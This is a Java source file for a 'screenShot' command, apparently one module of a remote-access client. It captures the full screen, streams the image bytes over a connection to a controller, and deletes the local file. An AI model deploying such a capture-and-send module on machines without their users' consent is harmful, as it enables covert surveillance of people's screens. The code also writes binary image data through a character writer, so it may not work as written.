package Client.command.commands;

import Client.command.Command;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.file.Files;
import java.util.ArrayList;

public class ScreenShot extends Command {
    public ScreenShot() {
        super("screenShot", "takes a screenshot", "screenShot");
    }

    @Override
    public void run(ArrayList<String> args, BufferedReader receive, PrintWriter send) {
        int i;
        try {
            BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ImageIO.write(image, "png", new File("screenshot.png"));
            FileInputStream fis = new FileInputStream("screenshot.png");

            while ((i = fis.read()) > -1) {
                send.write(i);
            }
            fis.close();
            Files.delete(new File("screenshot.png").toPath());

        } catch (AWTException | IOException e) {
            e.printStackTrace();
        }

    }
}
